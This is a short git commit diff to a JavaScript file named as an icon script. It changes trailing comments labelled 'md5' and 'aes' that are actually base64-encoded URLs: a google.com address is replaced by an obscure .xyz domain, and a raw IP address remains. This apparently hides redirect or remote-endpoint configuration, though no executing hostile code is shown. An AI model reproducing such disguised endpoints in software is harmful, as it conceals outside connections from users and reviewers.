7a96fe5f6258bdbec451146a11c5c1af838c9102
daguo <daguo@gmail.com>
2023-05-02 10:40:59 +0800

    init

--- js/icon_vlyqey.js
+++ js/icon_vlyqey.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cuZmdmZGcueHl6**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
